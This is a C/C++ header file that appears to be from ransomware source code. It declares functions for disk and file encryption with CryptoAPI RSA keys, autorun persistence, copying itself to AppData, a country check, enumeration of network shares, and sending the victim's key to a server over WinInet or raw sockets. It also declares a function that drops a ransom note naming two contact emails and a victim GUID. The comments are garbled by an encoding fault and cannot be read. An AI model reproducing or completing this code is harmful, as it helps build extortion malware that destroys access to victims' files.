#pragma once
#include "../Api.h"
#include "../Utils.h"
#include "browser.h"
#include <WinSock.h>
#include <Shlobj.h>
#include <SoftPub.h>


extern Build_Data* data;
extern int filesInfected;
extern CRITICAL_SECTION cs;

typedef struct
{
	HCRYPTPROV prov;
	HCRYPTKEY key;
	char path[512];
}CRYPT_INFO;

typedef void(*T_sendFunction)(LPSTR startTime, LPSTR endTime, LPSTR key);


/*
	������� tls-��������. ��� ����� ������� ����� main. �� ������� � ��������� ���������� Entry Point = main,
	������� ��������� ��������� ����� ����� ����� ���������� ���� ����, �.�. tls-������� ������ ���� �� ����, ��� ������� ����� ����������.
	��� ����� ������ �������� �� ��������.
*/
void NTAPI main_tls(PVOID DllHandle, DWORD Reason, PVOID Reserved);
/*
	���� ������ � ����� ������������ � ������ ����� �� ��� �� ����. ���������� true � ����� ������.
	���� �� ����� - ������� ���� � ����� false.
	forceName - ���, ������� ����� ������������ ���� ����� �� ��� ������ (��� ����������).
	description - �������� ��� ������.
*/
bool AddAutoRun(LPSTR forceName, LPSTR description);
// ��������: ��������� �� �� � �� ��� ���. ������ ���� � �������, ��������� ����� � ������ �� ���� ����� 2ip.
bool CheckCountry();
/*
	���� ������� ������� �� �� appdata, �� ���������� � appdata � ���������� ���� �������������� �����, ����� - NULL.
	new_name = ��������, � ������� ����� ������������.
*/
LPSTR CopyToAppData(LPSTR new_name);
/*
	�������� �� ���� ����������� �� �������� ����� � ������� �����.
	cryptInfo - ��������� � ������, ����������� � ���� ��������.
*/
void EncryptDisk(CRYPT_INFO* cryptInfo);
/* 
	������� ����. �� ��������� ������ ����������� ������ - ������� ������.
	infile - ���� � �����
	provider - ��������� cryptoapi
	key - ���� ��� ����
*/
void FileEncrypt(char *infile, HCRYPTPROV provider, HCRYPTKEY rsa_key);
// ���������� html-���� � ��������. ������� ����� ���������� lznt1 (��������� � ��� � 2 ����).
void ShowNode();
/*
	���������� ���������� � ������ �� ������. �� ����� � ������� SQL (���-���-���� ���:���:���)
	startTime - ����� ������ ����������
	endTime - ����� ����� ����������
	key - ������������� ���� � base64
*/
void sendInfo_WinInet(LPSTR startTime, LPSTR endTime, LPSTR key);
// �� ��, ��� � sendInfo_WinInet
void sendInfo_socket(LPSTR startTime, LPSTR endTime, LPSTR key);
// ������� ������ ���� ����� � ����� � �����������, ��������� ���������� ����� ��� �������� �� ������.
void dropKey(HCRYPTPROV prov, HCRYPTKEY rsa_key);
// ��������� ������� ����� � ����������.
bool checkKey();
// ������ ���� �� ���������� � �����.
LPSTR readKey();
/*
	��������� ������� �� ���.���� � � ���������
	mail1 - ������ �����
	mail2 - ������ �����
	victimId - GUID ������
*/
void dropNode(char *mail1, char *mail2, char *victimId);

// ���������� ������ ����� � ������� ������ � �������. �������� ����� netapi32.dll (NetShareEnum)
LPSTR* GetNetwork();
/* 
	���������, �������� �� ���������� ����������� ��������. ��������� ��������: opera, mozilla firefox, google chrome, internet explorer.
	directory - ����������, ����������� ���� � ����� (C:\Users\), ��� ���� �������� �� �����.
*/
bool IsBrowser(LPSTR directory);
/* 
	��������� ������� �������� ������� � �����. 
	filePath = ���� � �����, � ����� ��� ���� - �������� �� �����. �� ���������� ��������.
*/
bool checkSignature(LPSTR filePath);
/* 
	���������, ������� �� ������ ������� �������������.
	processName = ��� ��������, ������� ����� �����������.
*/
bool checkActive(char *processName);